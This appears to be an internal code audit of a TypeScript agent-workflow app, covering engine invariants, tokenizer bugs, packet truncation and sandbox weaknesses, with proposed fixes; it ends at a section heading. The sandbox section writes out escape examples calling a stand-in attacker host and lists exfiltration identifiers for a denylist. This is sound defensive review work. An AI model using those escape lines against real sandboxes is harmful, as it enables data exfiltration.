# Audit 01 — Core engine / algorithms / packet / sandbox

**Scope:** `src/lib/engine.ts`, `src/lib/algorithms.ts`, `src/lib/phases.ts`, `src/lib/types.ts`,
`src/lib/templates.ts`, `src/lib/packet.ts`, `src/lib/sandbox.ts` — plus the call-graph of their
consumers (`src/lib/store.ts`, `src/lib/io.ts`, `src/components/console.tsx`) read read-only to
verify claims and provenance.

**Method:** every finding below was verified against actual bytes at the cited `file:line`. Web
research was **not** used to describe this codebase. Items that could not be fully proven at
runtime are marked `unverified`. No source file was modified.

**Severity rubric**
- **P1** — wrong/false behavior or a security hole reachable through the shipped feature set.
- **P2** — real correctness/integrity/honesty risk under reachable conditions, or contradicts an
  explicit documented claim of the module.
- **P3** — quality/consistency/robustness/dead-weight.

**Big picture (verified):** the graph *is* a deterministic simulation today. `ai.ts` is imported by
nothing (`ai.ts:1-33` says "NOT WIRED"; verified zero imports), P0/P7 "research" is keyword
templates with honest `source:"illustrative"` labels, and P6 executes engine-authored template
strings through a sync `new Function` path. The bugs below are therefore mostly *latent seams at
the exact points where real LLM calls, live research, and real code execution will attach* — plus
a handful of reachable-today honesty/integrity defects.

---

## 1. Engine — state machine & integrity

### CORE-01 (P2) — The engine mutation API does not enforce its own documented invariants; guards live only in the UI store
**Files/lines:** `engine.ts:826-901` (`approveHitl`), `engine.ts:903-950` (`rejectHitl`),
`engine.ts:750-824` (`applyPhaseResult`); claim: `types.ts:88-89` ("Human-only gate: autopilot may
never auto-approve"), `engine.ts:511-512` (comment), `engine.ts:695` + `algorithms.ts:545`
("Rejection is illegal without ≥12 characters").

**Verified description**
- `approveHitl` never reads `project.hitl.forceHuman`. Passing `{ decidedBy: "autopilot" }` on a
  failed-P6 or reframe gate advances the graph, logs `hitl.approved`, and appends a ledger row.
  `force` is used *only* to decide whether to add an `hitl.approved_override` warning log
  (`engine.ts:845-846,858-868`) — it never gates the transition.
- `approveHitl` also does not check that `project.hitl` exists, that the pending gate's phase
  matches `project.currentPhase`, or that prior phases are sealed (`engine.ts:836-857`).
- `rejectHitl(note)` records `{note, at}` verbatim with no length/quality check
  (`engine.ts:907,910`) — `"x"` or whitespace is accepted.
- `applyPhaseResult(project, phase)` accepts an arbitrary `phase` and marks it complete, sets
  `currentPhase = phase`, and re-stamps — with no `phase === currentPhase`, `priorsSealed`, or
  `canEnter` check (`engine.ts:781-797`).
- Enforcement exists only at the call site: `store.ts:106-112` (`canAutopilot` → rejects
  `forceHuman`), `store.ts:270-315` (approve phase-match + P6 force override, reject ≥12 chars),
  `console.tsx:1076-1086,1146` (UI). `lib/testing/fixtures.ts:8-9` even documents that the *caller*
  must honor B-03/R3.

**Why it matters:** the packet contract tells a downstream agent "Illegal graph jumps … are
forbidden" (`packet.ts:128`) and `types.ts:88` states the invariant as engine semantics, but every
engine function trusts the caller. Today the only callers are the guarded store paths; the first
LLM/agent/server integration that calls these exported functions directly (see §9 G1/G5) silently
bypasses B-03/R3, the ≥12-char rule, and the phase-seal rule.

**Proposed fix (move guards into the engine):**
```ts
// approveHitl — reject autopilot on human-only gates and refuse no-gate/no-match approves.
if (project.hitl?.forceHuman && opts?.decidedBy === "autopilot" && !opts?.force) {
  // no transition: return { ...project, error } shape or throw — caller must surface it
}
if (!project.hitl || project.hitl.phase !== phase) return project; // ledger stays clean
// rejectHitl
const trimmed = note.trim();
if (trimmed.length < 12) throw new Error("Rejection requires at least 12 characters");
if (!project.hitl || project.hitl.phase !== project.currentPhase) return project;
// applyPhaseResult — enforce the edge
if (phase !== project.currentPhase) throw new Error(`P${phase} is not the current edge`);
if (!priorsSealed(project.phases, phase)) throw new Error("Prior phases are not sealed");
```

### CORE-02 (P2) — Rejection note minimum length exists only in the store + UI; ledger can record fabricated rejects
**Files/lines:** `engine.ts:903-950` vs `store.ts:306`, `console.tsx:1146`; claim at
`engine.ts:695`, `algorithms.ts:545`, `packet.ts` reuse of the note.

Same root as CORE-01 but worth its own row because the ledger is append-only truth
(`types.ts:115-116`): any unguarded `rejectHitl` call (including a duplicate tap or a future tool
caller) fabricates a decision row with `decidedBy:"human"` (`engine.ts:919` — hardcoded, even for
autopilot-initiated retries) that the packet then renders as a real human rejection
(`packet.ts:89-93,101-114`). Fix is CORE-01's `rejectHitl` guard + make `decidedBy` a parameter.

### CORE-03 (P2) — `currentPhase` is never validated/repair-passed on hydrate; one corrupt value bricks every mutation
**Files/lines:** `hydrateProject` `engine.ts:1069-1118`; index-into-array at
`packet.ts:69` (`PHASES[project.currentPhase]`) and `algorithms.ts:630`
(`PHASES[project.currentPhase].title`).

**Verified description:** `io.ts:70-77` validates `currentPhase ∈ 0..12` **on import only**. The
localStorage rehydrate path (`store.ts:400-412` → `seedIfEmpty` → `hydrateProject`) and any direct
`hydrateProject` caller get no bound check. `repairPhases` (`engine.ts:1029-1067`) repairs the
`phases` *array* but never clamps `currentPhase`. A payload with `currentPhase: 13` or `-1`
hydrates "successfully" when `packet && lattice && specGraph` (`engine.ts:1116` short-circuits the
re-attach), then the next `stampPacket`/`approveHitl` → `attachAlgorithms` → `runAlgorithms`
crashes on `PHASES[out-of-range].title` (`algorithms.ts:630`); `compileAgentPacket` has the same
hole at `packet.ts:69`. There is no recovery path — inconsistent with the project's own "repairs
are loud, never silent" B-25 philosophy (`engine.ts:1103-1115`).

**Proposed fix:** in `hydrateProject`, mirror `repairPhases` for the scalar: if
`!Number.isInteger(raw.currentPhase) || raw.currentPhase < 0 || raw.currentPhase > 12`, clamp to
the highest *complete* phase + 1 (or 0) and emit a `hydrate.repaired` log row; also prefer
`phaseDef()`/`PHASE_BY_ID` lookups over raw array indexing in `packet.ts:69` / `algorithms.ts:630`.

### CORE-04 (P2) — Operator notes edits never re-stamp the packet; persisted packet + artifact go stale (and export can duplicate the notes block)
**Files/lines:** `store.ts:365-368` (`setNotes` writes `notes` only), `store.ts:369-377`
(`refreshPacket` exists but is invoked from the UI **only** inside `copyPacket`,
`console.tsx:369`); packet embeds notes at `packet.ts:138-145` ("These override earlier
instructions"); hydrate trusts the stored packet at `engine.ts:1116`.

**Verified description:** typing notes (`console.tsx:899` → `setNotes`) mutates `project.notes`
but leaves `project.packet`, the packet artifact (`engine.ts:174-187`), and the A4 trace stale
until the operator happens to click "Copy agent packet". After a reload, `hydrateProject`
(`engine.ts:1116`) returns the stored stale packet untouched. `exportPacketText` (`io.ts:93-97`)
appends the live notes block *after* the stale packet — if the packet was previously compiled with
the older notes, the download contains two conflicting `## Operator notes` sections.

**Proposed fix:** re-stamp on notes change (debounced `setNotes` → `stampPacket`), or have
`compileAgentPacket` consumers always compile from live state and treat `project.packet` as a
derived cache; minimum: `exportPacketText` should refuse/merge when the packet embeds a stale
notes block.

### CORE-05 (P3) — `attachAlgorithms` rewrites + re-timestamps the whole trace array on every mutation
**Files/lines:** `engine.ts:719-748` (traces replaced at 729-743); triggered by `stampPacket`
(`engine.ts:190-193`), which runs on every approve/reject-retry/refresh and even twice per
auto-advanced phase (`store.ts:174` then `approveHitl` `engine.ts:900`).

**Verified description:** `traces: AlgorithmTrace[]` (`types.ts:146-151`) is a single
no-phase-keyed array that is *replaced* with fresh `ranAt: Date.now()` rows on every stamp. A
project at P8 shows A1 "ran now" and any earlier per-phase algorithm history is silently gone.
`emptyProject` also stamps an A2 summary "ranked 0 memory rows" at `engine.ts:1016-1021` before
bootstrap memory is attached (`algorithms.ts:532-556`), which is then never corrected (only A4's
`ranAt` is patched, `engine.ts:1020-1021`).

**Why it matters:** trace telemetry is presented as an algorithm-run log; it is actually a
"last packet compile" log. Downstream consumers (and the packet's implied provenance) can't tell
when A1-A8 really executed.

**Proposed fix:** keep `ranAt` from the *compute* calls and store per-phase trace history, or at
minimum fix the A2 summary in `emptyProject` to run after `bootstrapMemory` is assigned.

### CORE-06 (P3) — Regenerated phases re-log `phase.enter` without an exit; duplicate enters in the JSON log
**Files/lines:** `engine.ts:217-225` (`phase.enter` inside `synthesizePhase`, which runs on every
regeneration attempt), appended at `engine.ts:805-815`.

A rejected→retried→re-synthesized phase produces two `phase.enter` rows for one lifecycle.
Suggest `event: "phase.regenerate"` when `ctx?.attempt > 0` is passed (`engine.ts:198,213`).

### CORE-07 (P3) — `rejectHitl` doesn't re-seal the packet artifact and `unlockRetry` leaves no audit row
**Files/lines:** `engine.ts:923-949` (returns project without `sealPacketArtifact`/`attachAlgorithms`),
`engine.ts:952-958`.

After a reject the `packet` string still describes the pre-rejection state (no "Rejection loop"
section, no ledger row — the ledger row exists in `decisions` but the packet text is only rebuilt
on the next run/stamp). This is consistent-ish (reject → blocked → retry re-runs everything), but
the packet visible on the blocked screen (console reads `project.packet`, `console.tsx:833`) does
not mention the rejection that just happened. **Fix:** recompile on reject (cheap) or render the
ledger separately. Severity P3 (transient window, corrected on retry).

### CORE-08 (P2) — `sandbox.runtime` is a dead switch: engine never dispatches on it; "worker" claims diverge from actual execution
**Files/lines:** `engine.ts:453-471` (P6 always `buildPhase6Module` → `runGenerated`), imports at
`engine.ts:12`; `runSandboxed` (`sandbox.ts:242-324`) has **no production caller** (only
`sandbox.test.ts`); claim text at `sandbox.ts:163-165` (`sandboxClaim` "Worker isolate, 30s hard
cap, network primitives stubbed"), runtime default `engine.ts:996`, hydrate whitelist
`engine.ts:1071-1073`; a worker-runtime project is constructible by import/round-trip
(`packet.test.ts:238` sets exactly `{runtime:"worker", ramMb:64,…}`).

**Verified description:** `emptyProject` sets `runtime:"sync-template"` and `engine.ts:995`
comments that `runtime:"worker"` is "reserved … once producers need it", but nothing in the engine
consults `project.sandbox.runtime` when executing P6. If a project carries `runtime:"worker"`
(e.g., exported JSON edited/round-tripped), the packet (`packet.ts:36-41`) and P4 artifact
(`engine.ts:410`) claim a worker isolate while the module actually runs through the sync template
runner in the page global (`sandbox.ts:88-96`). The honest-executor path exists but is unreachable
from the app.

**Proposed fix:** make engine P6 dispatch on `project.sandbox.runtime` (async path → `runSandboxed`
with `workerFactory`, see §9 G4), or — until wiring exists — make `sandboxClaim`/hydrate refuse
`runtime:"worker"` and downgrade loudly instead of letting claim and execution diverge.

---

## 2. Algorithms — correctness

### CORE-09 (P3) — A2 FusionRank lexical overlap still uses the legacy unstemmed tokenizer; inflectional matches silently fail
**Files/lines:** `algorithms.ts:125-131` (`tokens()` — lowercase + stopwords only, **no stemming**)
vs `algorithms.ts:742-745` (`tokenizeWords` — the B-15/R7 stemmed, word-boundary tokenizer that
everything else was migrated to); FusionRank's dominant term uses `tokens()` at
`algorithms.ts:219,241,248` (`overlap(q, tokens(item.text))`).

**Verified description:** the sort key and the 0.55-weighted content term in `ce`
(`algorithms.ts:247-250`) compare raw inflected words. Memory rows and queries that differ only by
inflection (`"reroute"` vs `"rerouting"`, `"invoice"` vs `"invoicing"`, `"jobs"` vs `"job"`) score
zero lexical overlap even though `phraseHits` (`algorithms.ts:133-142`) and `intentLattice`
(`algorithms.ts:149-160`) deliberately resolve the same pairs via stemming. The comments at
`algorithms.ts:150-152, 718-723` show the stemmer is trusted elsewhere; A2 is the one survivor.

**Why it matters:** FusionRank is the packet's only memory-retrieval mechanism (`packet.ts:72-76,
200-203`); ranking quality degrades exactly when memory prose and the current phase brief use
different inflections — the common case.

**Proposed fix:** stem the overlap inputs:
```ts
const q = tokenizeWords(query);                       // stemmed query tokens
const overlap = (a: string[], b: string[]) => { … };  // unchanged
// inside sort + ce:  overlap(q, tokenizeWords(item.text))
```
(Keep `tokens()`'s stopword set for `intentLattice`'s bag, or replace it there too after checking
the hyphen-compound behavior in CORE-10.)

### CORE-10 (P3) — Hyphenated compounds defeat both the tokenizer and the stemmer; `realtime`/`multi-tenant`/`follow-up` dictionary terms are effectively unreachable from prose
**Files/lines:** `algorithms.ts:743` (regex `[a-z0-9]+(?:[+-][a-z0-9]+)*` keeps `real-time` as ONE
token), `algorithms.ts:724-739` (`stemToken`: trailing-`e` drop runs before suffix stripping →
`"real-time"` → `"real-tim"` while `"realtime"` → `"realtim"` — they never converge); dictionary
entries `algorithms.ts:57` (`follow-up`), `:83` (`same-day`), `:90` (`realtime`), `:92`
(`multi-tenant`); downstream `includes("realtime")` at `algorithms.ts:577`, substring
`key.includes(k)` at `algorithms.ts:787-791`.

**Verified description:** a brief that says `"real-time dispatch"` produces token
`"real-time"`/stem `"real-tim"`; the LEX term `"realtime"` (stem `"realtim"`) never matches, so
the constraint is missed and: the `scale` axis never pays the −1.5 realtime penalty
(`algorithms.ts:577`), `LIB_CONSTRAINT.realtime` never fires (`algorithms.ts:767-773,785-793`),
and the oracle/constraint rows are empty. Likewise `"follow up"` (spaced) never matches LEX
`follow-up` because `phraseHits` requires a single `"follow-up"` token (`algorithms.ts:138-141`),
and `"multi tenant"` vs LEX `multi-tenant` fails the same way. Only verbatim hyphenated or
verbatim-joined spellings hit.

**Proposed fix (sketch):** split hyphenated compounds at tokenize time — match `[a-z0-9]+`
sequences and drop `[+-]` separators from *both* sides (vocab terms and brief text), so
`real-time`, `realtime`, `real time` all stem-compare equal; keep the display label hyphenated.
Re-check `tokens()` (`algorithms.ts:125-131`) uses the same split so `bag` frequencies agree.

### CORE-11 (P3) — `scheduleConstraints` can add "extra HITL" gates that autopilot then auto-approves
**Files/lines:** `algorithms.ts:269-272` (`extraHitl.add(6)` on `hitlBias || securityDelta>=2`,
`.add(11)` on `apiDelta>=2`) vs `store.ts:106-112` (`canAutopilot`: only `forceHuman` and
`STOCK_HITL = [4,5,8,9]` are excluded; extra gates 6/11 are not consulted, and the tie-breaker is
`schedule.tightness < 7.2`).

**Verified description:** `canAutopilot` never checks `project.schedule?.extraHitl`. Gates the
scheduler added *because of domain risk* (`algorithms.ts:278-282` "Elevate isolate…"/"Cap
live-tool calls…") can be auto-approved when tightness < 7.2. Analysis of the formula
(`tightness = 4 + securityDelta*1.5 + apiDelta + complexity*0.25`, `algorithms.ts:272`): the
window is narrow — security-driven gates push tightness ≥ 7 and bind — but an apiDelta-only case
(e.g. `apiDelta:2`, low complexity) can land under 7.2, so the "extra HITL" for live tool binding
(P11, `engine.ts:656-663`) is autopilot-swallowed exactly when the scheduler decided risk was
elevated. *(Reachability analysis is analytic, not executed — `unverified` as a live repro.)*

**Proposed fix:** in `canAutopilot`, `if (project.schedule?.extraHitl.includes(project.hitl.phase)) return false;`
— the scheduler's risk decision should not be overridable by the tightness heuristic.

### CORE-12 (P3) — `intentLattice` health-ops fallback nodes are appended after the sort, breaking the weight ordering contract
**Files/lines:** `algorithms.ts:169` (`unique.sort`), `:170-175` (push of forced `hipaa`/`phi`),
`:188` (`nodes: unique.slice(0,18)`).

Forced nodes land at the *end* of `nodes` regardless of their 0.9 weight, so consumers that trust
descending weight order (e.g. render top-N nodes) see `hipaa/phi` last. Also complexity
(`algorithms.ts:189`) counts forced nodes but is computed on the post-push array — intended, but
only by accident of ordering. Fix: re-sort after the push (and slice first, then compute
complexity on the sliced set for consistency).

### CORE-13 (P3, small) — `tokens()` drops single-char tokens before stopword removal is meaningful, and A3/A5..A8 note text promises streaming/oracle behavior no engine path performs
**Files/lines:** `algorithms.ts:130` (`t.length > 1`), notes at `algorithms.ts:601-610`,
`engine.ts:353-354,380`.

These are deterministic template texts; they are honest *plans*, but they read as implemented
facts ("Long-running tools must stream over WebSocket MCP", "RRF + cross-encoder applies to RAG
and long-term memory" — no RAG/cross-encoder exists; only FusionRank does). See §8 data-honesty.
No code change proposed beyond §9 wiring; flagging for the fix wave to decide wording.

---

## 3. Packet v2 — truthfulness & machine block

### CORE-14 (P2) — 14 000-char truncation can sever the machine-readable ```json block
**Files/lines:** `packet.ts:239-241` (`.slice(0, 14000)` + truncation marker on the *joined* full
string); JSON block is embedded at `packet.ts:131-135`; the envelope grows with the decision
ledger (`packet.ts:47-54`, capped at 100 rows by `engine.ts:857,928`) and memory (80 rows,
`engine.ts:804`).

**Verified description:** `systemJson` is pretty-printed 2-space JSON; a project near the 100-row
ledger cap (plausible across long human sessions: every reject *and* every re-approve appends a
row) produces an envelope alone > 14 KB. The truncation happens on the joined document with no
awareness of the fence: the output can end **inside** the ```json block (unterminated fence,
unparseable body), which breaks the I7 machine-readable contract documented at
`packet.ts:16-20` ("a script can still extract + JSON.parse the body"). The truncation marker does
warn — but a downstream parser gets a hard failure, not a warning.

**Proposed fix (sketch):** compile the JSON block first and never truncate inside it — either
truncate only *after* the fence closes (drop the later prose sections, keep the Required output
schema tail), or cap ledger/memory rows inside `systemJson` before stringifying:
```ts
const sysJson = systemJson(project, phase, compiledAt, { count: loopCount, note: lastLoopNote });
// budget = 14000 - len(header+mission prefix); if sysJson exceeds budget, truncate decisions/phases rows first
```

### CORE-15 (P3) — Artifact snapshot is position-relative and phase-blind
**Files/lines:** `packet.ts:77-84` (`.filter(kind !== "packet").slice(-8)` over insertion order).

The "Artifacts (trimmed)" section is simply the last 8 non-packet artifacts by array position, not
the 8 most relevant to the current edge; after a P0→P12 run the current phase's artifacts can be
missing from the packet while older phases dominate. Proposals: order by `phase === currentPhase`
first, then recency, then slice.

### CORE-16 (P3) — `rejection_loop`/`## Rejection loop` is keyed to the *current* phase's history only, and the free-text fallback can drift from the ledger
**Files/lines:** `packet.ts:95-98` (`curRecord = find(id === currentPhase)`), `:101-114`
(`priorRejected`/`priorBlock`), `:193-198`.

Verified consistent for the normal reject→retry→park flow. Edge: a phase with a *legacy*
`rejectionNote` (`engine.ts:910` writes both note and history, so legacy only arises pre-v2
payloads) renders in `priorBlock` but has no ledger row; `hasRejectDecisions` then suppresses the
detail lines ("see ledger below") that do not exist for that phase (`packet.ts:104-107`) — the
packet points at a ledger that has no entry for it. Fix: base the pointer on the actual ledger,
and keep detail lines for rejectionHistory rows that predate ledger entries.

### CORE-17 (P3) — Packet machine JSON omits gate unmet criteria and rejection notes per phase
**Files/lines:** `packet.ts:55-60` (phases rows expose only `id/status/rejections/gate_passed`).

`PhaseRecord.gate.unmet` (`types.ts:118`) and `rejectionNote` are machine-relevant for a governed
agent (it must know *which* DoD criteria failed), but are prose-only. Add `gate_unmet: string[]`
and `last_rejection_note` to the JSON block.

---

## 4. Sandbox

### CORE-18 (P2) — Worker "network deny is real" claim is bypassable via qualified global access (`self.fetch`, `globalThis.fetch`, `self.importScripts`)
**Files/lines:** `sandbox.ts:199-225` (`sandboxWorkerSource`): stubs are passed **only as function
parameters** (`:214-218`, `fn(networkStub, networkStub, networkStub, sandboxConsole)`); the worker
global's real `fetch`/`XMLHttpRequest`/`importScripts`/`EventSource` remain live on `self`;
comments/claims at `sandbox.ts:202` ("no host scope, network primitives stubbed"), `:230-231`
("network deny is real, not a regex"), `:163-165` (`sandboxClaim`: "network primitives stubbed
(fetch/WebSocket/XHR throw)").

**Verified description:** inside the `new Function` scope, bare `fetch` resolves to the stub
parameter, but `self.fetch("https://attacker/…")`, `globalThis.fetch(…)`, or
`self.importScripts("https://attacker/x.js")` resolve through the scope chain to the blob
worker's **real** network stack (a blob worker shares the page origin and can issue requests).
The worker runs arbitrary `code` (`sandbox.ts:213-219`) with *no* denylist by design
(`sandbox.ts:79-80` "runSandboxed has no denylist; its network stubs … are the real
enforcement") — so the real enforcement is bypassable by a one-line qualified reference. Dormant
today (CORE-08: no production caller), but this is the designated executor for LLM/user code; it
becomes P1 the moment §9 G4 wires it.

**Proposed fix (sketch) — hard-overwrite the global surfaces before running user code:**
```ts
// inside sandboxWorkerSource(), before `self.onmessage = …`:
function hardStub(name: string, value: unknown) {
  try { Object.defineProperty(self, name, { value, writable: false, configurable: false }); } catch {}
}
hardStub("fetch", networkStub);
hardStub("XMLHttpRequest", networkStub);
hardStub("WebSocket", networkStub);
hardStub("EventSource", networkStub);
hardStub("WebTransport", networkStub);
hardStub("importScripts", networkStub);            // workers use importScripts for script loads
try { Object.defineProperty(navigator, "sendBeacon", { value: networkStub }); } catch {}
// also stub Worker/SharedWorker constructors; keep postMessage/onmessage/console for the harness
```
Keep the parameter shadowing as defense-in-depth. Add a sandbox test that asserts
`self.fetch("http://x")` throws inside the worker body.

### CORE-19 (P3) — Captured `console.*` logs are discarded; `SandboxResult` has no log channel
**Files/lines:** `sandbox.ts:207-209` (`logs`, `capture`, `sandboxConsole` — never read after
execution), reply payload `sandbox.ts:219`/`:221` carries only `{id, ok, detail}`; claim at
`sandbox.ts:174-175` ("console.* is captured instead of leaked to the host").

Captured-and-thrown-away: a failing run's console output — exactly what a healer/agent needs —
never surfaces in `result.detail`. Fix: append `logs` to `detail` on failure (`detail:
(err.message) + (logs.length ? " · console: " + logs.join(" | ") : "")`) or extend
`SandboxResult` with `logs?: string[]` and thread it through `runSandboxed`'s reply handling
(`sandbox.ts:308-312`).

### CORE-20 (P2) — `runGenerated`'s sync gate is spoofable and its denylist misses page-global network primitives
**Files/lines:** shape gate `sandbox.ts:81-83` (`source.startsWith("const JOBS = [") &&
source.includes("function test_no_skip")`); denylist `sandbox.ts:12-13` (bans
`process|require|globalThis|window|self|fetch|WebSocket|XMLHttpRequest|eval|Function|import|document|localStorage|indexedDB`);
execution `sandbox.ts:88-96` runs in the **page global** (`new Function(body)`).

**Verified description:** two facts combine:
1. The gate is a *content* check, not a provenance check. Any source that merely begins with
   `const JOBS = [` and contains the substring `function test_no_skip` (an LLM could emit this by
   accident or mimicry) is admitted to the host-global sync path.
2. The denylist is a bare-identifier regex over masked code (`sandbox.ts:24-67`) and omits
   page-global exfil primitives that are *not* covered by the identifier ban: `navigator.sendBeacon`,
   `EventSource`, `Worker`, `SharedWorker`, `Image`/`<img>` network, `location`. `globalThis`
   itself is banned, but `navigator` is not.

Today this is contained because `buildPhase6Module` (`sandbox.ts:119-155`) JSON-escapes every
dynamic insert (no user statements reach the template) and the only caller is `engine.ts:463-469`.
But `runGenerated` is an exported, documented public gate, and §9 G4 will route LLM output near
it; the gate + denylist must not be the last line for non-engine source. The module's own comment
(`sandbox.ts:77-80`) says exactly that non-template source "must go through runSandboxed()" — but
nothing enforces provenance, only shape.

**Proposed fix:** add an engine-only canary (a marker string only `buildPhase6Module` emits) to
the shape check and reject anything without it with the actionable `runSandboxed()` message; and
extend `FORBIDDEN` with `sendBeacon|EventSource|Worker|SharedWorker|navigator|location|Image` for
the sync path so the two layers agree.

### CORE-21 (P3) — Dormant deploy-block rule in the P6 template is unreachable
**Files/lines:** `sandbox.ts:132` (`if (REJECTION && spec.phase === 9) throw new Error("deploy
blocked until rejection addressed")`).

The template encodes "a rejection blocks P9 deploy", but the test tail (`sandbox.ts:89`,
`sandbox.ts:216`) only ever invokes `test_happy`/`test_no_skip`/`test_rejection_addressed` — none
call `synthesize` with `phase: 9`, so the rule never executes and no engine path enforces it
elsewhere. Either wire it (deploy gating is a real governance claim, `packet.ts:233` "Do not
deploy without HITL on P9") or delete it; dead security rules read as implemented controls.

---

## 5. Types / templates / hydration type-holes

### CORE-22 (P3) — `_v` version marker is write-only
**Files/lines:** `types.ts:230-231`, written at `engine.ts:1014,1077`; **no reader anywhere**
(verified by grep: only writes + a comment in `io.ts:14`).

`_v: 2` is stamped unconditionally on create *and* hydrate but never branched on, so it cannot
drive migrations; a future v3 payload will be silently re-stamped to 2. Either implement version
dispatch or drop the field.

### CORE-23 (P3) — `ProjectStatus "blocked"`/`running` etc. only ever set by two functions; `"locked"`/`"ready"` transitions are duplicated across store + engine
**Files/lines:** `types.ts:6-11`; writers `engine.ts:787,796,884,927,957`, `store.ts:136-141,151-158,165-171`.

Minor: `advanceOnce` (`store.ts:119`) indexes `project.phases[phase]` by array position while its
sibling `priorsSealed` was explicitly hardened to index by id (`phases.ts:122-131`, A20 comment).
The invariant "array index === phase id" currently holds because `repairPhases` always inserts +
sorts (`engine.ts:1058-1064`), but the codebase itself flags that pattern as unsafe (A20); use
`find((p) => p.id === phase)` in `store.ts:119` for consistency.

### CORE-24 (P3) — `templates.ts` briefs vs. LEX vocabulary drift (hyphen-mangled tokens suppress constraints; the domain fallback does not compensate)
**Files/lines:** `templates.ts:1-26`; verified against `intentLattice` for the four stock briefs —
only the `dispatch` brief reliably yields ≥2 constraints (`same-day`, `offline`). The `clinic`
template's "HIPAA-safe notes" never matches the LEX `hipaa` constraint because `tokenizeWords`
keeps hyphens (`algorithms.ts:743`), producing one token `hipaa-safe` (stem `hipaa-saf`,
`algorithms.ts:724-739` trailing-`e` drop) instead of `hipaa`; the health-ops *domain* fallback
(`algorithms.ts:170-175`) does **not** compensate here because it only fires when neither
`hipaa` **nor** `phi` is present — and the clinic brief's "No PHI in logs" adds a `phi` risk node
(LEX risk `phi`, `algorithms.ts:100`), which suppresses the forced push. Result: the clinic
template ships without the `hipaa` constraint, so `scheduleConstraints`' hipaa/pci/gdpr/soc2/phi
test (`algorithms.ts:267`) and the `LIB_CONSTRAINT.hipaa` audit-logger suggestion
(`algorithms.ts:770-773`) never trigger for the one template that most needs them (only the base
`DOMAIN_RISK["health-ops"].security = 2` carries the risk). Root cause is CORE-10's hyphen
handling; worth a regression test on all four stock briefs once the tokenizer is fixed.

---

## 6. Data-honesty regressions (simulated-as-real sweep)

Sweep result — **no unlabeled simulation found**; the honesty scaffolding works:
- Competitor rows carry `source: "illustrative"` (`engine.ts:56-57`), P7 artifact warns in its
  first line (`engine.ts:529`), types reserve `"cited"` (`types.ts:63-64`).
- Scorecard section is labeled "deterministic feasibility estimate — template-derived, not live
  research" (`packet.ts:208`); P4 artifact prints the *actual* sandbox claim under the policy
  bullets (`engine.ts:410`); sandbox default comment is honest (`engine.ts:993-995`).
- `ai.ts` refuses to invent output when unconfigured (`ai.ts:12-18,82-84`).

Residual honesty risks (all verified as *claims without backing implementation*):
- **R-1:** `model_route`/`model: local-edge` (`packet.ts:35,184`, `console.tsx:480`) is a constant
  (`engine.ts:992`, no writer anywhere) yet reads as routing truth; combined with P1 artifact text
  describing a LiteLLM failover stack (`engine.ts:314-327`) that has no code, a downstream agent
  can be misled into believing a model ran. (CORE-17 / §9 G6.)
- **R-2:** A2/A8 phase descriptions promise RAG, cross-encoder re-rank, cross-encoder on LTM,
  MCP WebSocket frames, adversarial simulation, and crew tool execution (`engine.ts:344-355,369-390`,
  `algorithms.ts:499-527`) — none exist; they are honest *plans* only by convention. The packet
  reproduces crew/tool rows (`packet.ts:159-162`) as if the crew operated. Decide a labeling
  convention ("planned"/"simulated") before any real agent consumes the packet.
- **R-3:** `P6 sandbox (last run)` (`packet.ts:188`) renders `tests.pass` — honest for the
  template runner, but "sandbox" wording will read as a real isolate to an LLM. (CORE-08/20.)

---

## 7. Dead exports / unused (call-graph evidence, non-test)

Grep over all of `src` (`rg -l "<sym>" -g '*.ts' -g '*.tsx'`, minus the defining file). A symbol is
listed when its only hits are its own file (and tests where noted).

| Export | Location | Evidence |
|---|---|---|
| `synthesizePhase` | `engine.ts:195` | only hit `engine.ts` (internal call `engine.ts:756`) — exported, no external consumer |
| `dedupeMemoryIds` | `engine.ts:164` | only hit `engine.ts` (internal 804/898/939) |
| `rejectionResponseBlock` | `engine.ts:157` | only hit `engine.ts` (internal 778) |
| `inferDomain` | `engine.ts:81` | only hit `engine.ts` (internal 961); store uses `inferName` (`store.ts:198`) |
| `HITL_PHASES` | `phases.ts:133` | only hit `phases.ts`; store imports the duplicated literal `STOCK_HITL` (`store.ts:13,110`) — the two can diverge if a phase's `hitl` flag changes |
| `PHASE_IDS` | `types.ts:1` | only hit `types.ts` |
| `runSandboxed` | `sandbox.ts:242` | hits = `sandbox.ts` + `sandbox.test.ts` only — the real worker executor is **unreachable from the app** (CORE-08) |

(Used-and-needed, verified: `fusionRank` packet.ts:72; `librariesFor` engine.ts:125;
`estimateTokens` console.tsx:324; `fnv1a` engine.ts:460 + dod.ts; `bootstrapMemory`
engine.ts:1018; `hydrateProject` io.ts:16 + store.ts:403; `stampPacket` store.ts:174/375;
`canEnter`/`priorsSealed` store.ts:134-148; `sandboxClaim` packet.ts:37 + engine.ts:410;
`healSource`/`buildPhase6Module`/`runGenerated` engine.ts:461-469. `phaseDef` engine.ts:212 +
repairPhases.)

---

## 8. LLM / chat / agent-integration gaps (requirements only — NOT implemented here)

Base state (verified): `ai.ts` has **zero importers**; every "AI" beat is deterministic; engine
mutations are UI-store-guarded (CORE-01); P6 execution is engine-authored-only (CORE-08/20);
research is template-only.

**G1. Real provider calls (DeepSeek-ready)**
- Move `complete()` (`ai.ts:78-137`) behind a server fn / server route so `VITE_AI_API_KEY` never
  ships in the client bundle (ai.ts:22-33 already warns). No code in `src/lib` may call the
  provider directly from the client.
- Add a DeepSeek preset: base URL + model list. Today only x.ai is defaulted (`ai.ts:35-36`); the
  union `ModelRoute` (`types.ts:13`) has no deepseek member, and `modelRoute` is a constant
  (CORE-17/R-1) — needs real per-phase routing + failover before any packet model claim is true.
- Use `estimateTokens` (`algorithms.ts:683-702`) for the packet context budget; DeepSeek context
  windows differ from the ±15% cl100k estimate — document the mapping.
- Add retry/backoff + streaming; `complete()` aborts at a hard 20 s (`ai.ts:89`) which is too
  short for multi-step reasoning outputs.

**G2. Chat/agent loop that consumes the packet**
- Endpoint: input = `compileAgentPacket(project)` (`packet.ts:68`) + current HITL/notes; output =
  the packet's Required output schema (phase work / files / patches / tests / risks,
  `packet.ts:222-231`). Validate with zod before any state change.
- Apply patches only through new engine entry points that enforce CORE-01 guards
  (current-phase, priorsSealed, forceHuman, ledger append) — do **not** call
  `applyPhaseResult`/`approveHitl`/`rejectHitl` directly from agent code.
- Every agent action must land an auditable row (`types.ts:98-107`) with a real actor; extend
  `decidedBy` (or add `actingAs`) with a machine-agent identity instead of hardcoding `"human"`
  (`engine.ts:919`).
- Rejection steering for LLM regeneration needs the full loop context — rejectionHistory + last
  note + ledger — already assembled by the packet (`packet.ts:89-114,193-198`); pass it through.

**G3. Live research for P0/P7/P11**
